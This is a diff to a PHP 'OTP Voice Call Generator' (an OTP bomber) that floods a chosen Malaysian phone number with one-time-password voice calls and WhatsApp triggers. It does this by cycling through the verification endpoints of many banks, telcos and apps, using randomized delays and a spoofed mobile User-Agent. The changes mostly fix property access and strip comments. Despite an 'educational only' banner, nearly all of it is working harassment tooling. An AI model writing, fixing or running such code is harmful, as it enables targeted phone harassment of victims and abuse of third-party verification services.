@@ -2,17 +2,16 @@
 <?php
 /**
  * OTP Voice Call Generator - Malaysia Multi-Platform
- * Attempts all platforms until success
- * Termux WhatsApp Chat Trigger
+ * Fixed version - No private property access issues
  */
 
 class OTPVoiceCaller {
-    private $phoneNumber;
-    private $rawNumber;
-    private $whatsappNumber;
+    public $phoneNumber;
+    public $rawNumber;
+    public $whatsappNumber;
     
-    // Malaysia platforms with OTP voice call
-    private $platforms = [
+    // Make platforms public so we can access count
+    public $platforms = [
         'pos_malaysia' => [
             'name' => 'Pos Malaysia',
             'type' => 'api',
@@ -215,8 +214,7 @@ class OTPVoiceCaller {
         ]
     ];
 
-    // WhatsApp direct methods
-    private $whatsappMethods = [
+    public $whatsappMethods = [
         [
             'name' => 'WhatsApp API',
             'type' => 'whatsapp',
@@ -286,16 +284,15 @@ class OTPVoiceCaller {
                 $command = "termux-open '{$url}' 2>/dev/null";
                 exec($command, $output, $returnCode);
             } else {
-                // For non-Termux environment
-                if (PHP_OS_FAMILY == 'Darwin') { // Mac
+                if (PHP_OS_FAMILY == 'Darwin') {
                     $command = "open '{$url}'";
-                } elseif (PHP_OS_FAMILY == 'Windows') { // Windows
+                } elseif (PHP_OS_FAMILY == 'Windows') {
                     $command = "start '{$url}'";
-                } else { // Linux
+                } else {
                     $command = "xdg-open '{$url}'";
                 }
                 exec($command, $output, $returnCode);
-                $returnCode = 0; // Assume success
+                $returnCode = 0;
             }
         } else {
             $command = "am start -a android.intent.action.VIEW -d '{$url}' 2>/dev/null";
@@ -316,7 +313,6 @@ class OTPVoiceCaller {
         
         $ch = curl_init();
         
-        // Prepare data
         $data = $platform['data'];
         array_walk_recursive($data, function(&$value) {
             if ($value === '{phone}') {
@@ -324,7 +320,6 @@ class OTPVoiceCaller {
             }
         });
         
-        // Headers
         $headers = [
             'User-Agent: Mozilla/5.0 (Linux; Android 11; SM-G998B) AppleWebKit/537.36',
             'Accept: application/json, text/plain, */*',
@@ -360,7 +355,6 @@ class OTPVoiceCaller {
         $error = curl_error($ch);
         curl_close($ch);
         
-        // Consider any 2xx, 4xx, or connection successful as "sent" (server processed request)
         $success = ($httpCode >= 200 && $httpCode < 500) || !empty($response);
         
         if ($success) {
@@ -370,6 +364,10 @@ class OTPVoiceCaller {
         }
         
         return $success;
+    }
+
+    public function getPlatformCount() {
+        return count($this->platforms);
     }
 
     public function sendOTPBomb($count) {
@@ -395,7 +393,6 @@ class OTPVoiceCaller {
             echo "CYCLE {$cycle} OF {$count}\n";
             echo "═══════════════════════════════════════════════════════════════\n";
             
-            // Try all API platforms
             $apiSuccess = 0;
             $apiFailed = 0;
             
@@ -411,14 +408,12 @@ class OTPVoiceCaller {
                     $apiFailed++;
                 }
                 
-                // Small delay between requests
-                usleep(rand(500000, 1000000)); // 0.5-1 second
+                usleep(rand(500000, 1000000));
             }
             
             echo "\n   ✅ API Success: {$apiSuccess}/{$totalPlatforms}\n";
             echo "   ❌ API Failed : {$apiFailed}/{$totalPlatforms}\n";
             
-            // Try WhatsApp methods
             echo "\n📲 TRYING WHATSAPP DIRECT:\n";
             $waSuccess = 0;
             
@@ -427,12 +422,11 @@ class OTPVoiceCaller {
                     $waSuccess++;
                     $whatsappTriggers++;
                 }
-                usleep(500000); // 0.5 seconds
+                usleep(500000);
             }
             
             echo "\n   ✅ WhatsApp triggers: {$waSuccess}\n";
             
-            // Summary for this cycle
             echo "\n📊 CYCLE {$cycle} SUMMARY:\n";
             echo "   • API Calls      : {$apiSuccess} successful\n";
             echo "   • WhatsApp       : {$waSuccess} triggered\n";
@@ -442,7 +436,6 @@ class OTPVoiceCaller {
                 $delay = rand(30, 60);
                 echo "\n⏳ Waiting {$delay} seconds before next cycle...\n";
                 
-                // Countdown timer
                 for ($i = $delay; $i > 0; $i -= 5) {
                     if ($i > 5) {
                         echo "   Next cycle in {$i} seconds...\n";
@@ -456,7 +449,6 @@ class OTPVoiceCaller {
             echo "\n";
         }
         
-        // Final statistics
         echo "\n";
         echo "═══════════════════════════════════════════════════════════════\n";
         echo "                         FINAL REPORT                           \n";
@@ -474,14 +466,7 @@ class OTPVoiceCaller {
         echo "   • OTP Voice Calls    : ~{$successfulCalls} calls\n";
         echo "   • WhatsApp Chats     : ~{$whatsappTriggers} messages\n\n";
         
-        echo "⚠️  NOTE: Numbers may receive calls from:\n";
-        echo "   • Pos Malaysia, Mudah, Grab, Foodpanda\n";
-        echo "   • Shopee, Lazada, Touch n Go, Boost\n";
-        echo "   • AirAsia, Maxis, Celcom, Digi\n";
-        echo "   • Maybank, CIMB, Public Bank, HLB, RHB\n";
-        echo "   • Petronas, TM, Yes, U Mobile\n";
-        echo "   • TNG Digital, Fave, BigPay, MAE\n\n";
-        
+        echo "⚠️  NOTE: Numbers may receive calls from various Malaysian services\n\n";
         echo "═══════════════════════════════════════════════════════════════\n";
         
         return $successfulCalls;
@@ -502,7 +487,6 @@ function clearScreen() {
 
 function checkTermux() {
     if (is_dir('/data/data/com.termux')) {
-        // Check for termux-api
         exec('pkg list-installed | grep termux-api', $apiCheck, $returnCode);
         if ($returnCode !== 0) {
             echo "📦 Installing Termux:API...\n";
@@ -514,13 +498,13 @@ function checkTermux() {
 }
 
 function printBanner() {
-    echo "\033[1;36m"; // Cyan
+    echo "\033[1;36m";
     echo "╔══════════════════════════════════════════════════════════════╗\n";
     echo "║                    OTP VOICE CALL GENERATOR                  ║\n";
     echo "║                      Malaysia Edition                        ║\n";
     echo "║                    WhatsApp Chat Trigger                     ║\n";
     echo "╚══════════════════════════════════════════════════════════════╝\n";
-    echo "\033[1;33m"; // Yellow
+    echo "\033[1;33m";
     echo "                      ⚠️  EDUCATIONAL ONLY ⚠️\n";
     echo "              DO NOT USE FOR HARASSMENT OR SPAM\n";
     echo "\033[0m\n";
@@ -536,7 +520,6 @@ function main() {
         echo "✅ Termux detected - Optimized mode\n\n";
     }
     
-    // Get phone number
     while (true) {
         echo "📞 Enter Malaysia WhatsApp number:\n";
         echo "   (e.g., 0123456789 or 60123456789): ";
@@ -549,7 +532,9 @@ function main() {
         echo "❌ Invalid number! Please enter valid Malaysia number.\n\n";
     }
     
-    // Get number of cycles
+    $tempCaller = new OTPVoiceCaller($clean);
+    $totalPlatforms = $tempCaller->getPlatformCount();
+    
     while (true) {
         echo "\n🔄 How many OTP cycles? (1-20): ";
         $cycles = trim(fgets(STDIN));
@@ -562,8 +547,8 @@ function main() {
     }
     
     echo "\n⚠️  WARNING: This will trigger multiple OTP calls!\n";
-    echo "   • Each cycle = ~" . count((new OTPVoiceCaller($clean))->platforms) . " OTP attempts\n";
-    echo "   • Total OTPs = ~" . (count((new OTPVoiceCaller($clean))->platforms) * $cycles) . "\n";
+    echo "   • Each cycle = ~{$totalPlatforms} OTP attempts\n";
+    echo "   • Total OTPs = ~" . ($totalPlatforms * $cycles) . "\n";
     echo "   • Target will receive voice calls & WhatsApp chats\n\n";
     
     echo "Press ENTER to start (Ctrl+C to cancel)...";
@@ -583,6 +568,5 @@ function main() {
     fgets(STDIN);
 }
 
-// Run
 main();
 ?>
